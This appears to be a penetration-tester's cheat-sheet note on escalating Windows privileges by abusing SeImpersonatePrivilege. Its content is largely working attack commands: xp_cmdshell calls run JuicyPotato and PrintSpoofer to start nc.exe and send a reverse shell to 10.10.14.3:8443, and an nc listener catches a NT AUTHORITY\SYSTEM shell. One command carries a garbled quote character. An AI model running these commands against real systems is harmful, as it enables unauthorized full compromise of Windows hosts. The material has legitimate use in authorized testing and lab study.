# SeImpersonate and SeAssignPrimaryToken
## whoami /priv confirms that SeImpersonatePrivilege is listed.
### JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.
1. Escalating Privileges Using JuicyPotato
2. upload JuicyPotato.exe to the target server
3. upload nc.exe to the target server
4. https://juggernaut-sec.com/seimpersonateprivilege/
5. https://ohpe.it/juicy-potato/CLSID/
the following command is used within MSSQL with xp_cmdshell
```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
```
-l is the COM server listening port
-p is the program to launch (cmd.exe)
-a is the argument passed to cmd.exe
-t is the createprocess call.
```
we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively
```
nc -lvnp 8443
```
4. reverse shell created with nt authority/system
### Windows Server 2019 and Windows 10 build 1809 onwards
#### PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access
1. upload PrintSpoofer.exe to the target server
2. upload nc.exe to the target server
the following command is used within MSSQL with xp_cmdshell
```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd‚Äù
```
```
nc -lvnp 8443
```
3. reverse shell created with nt authority/system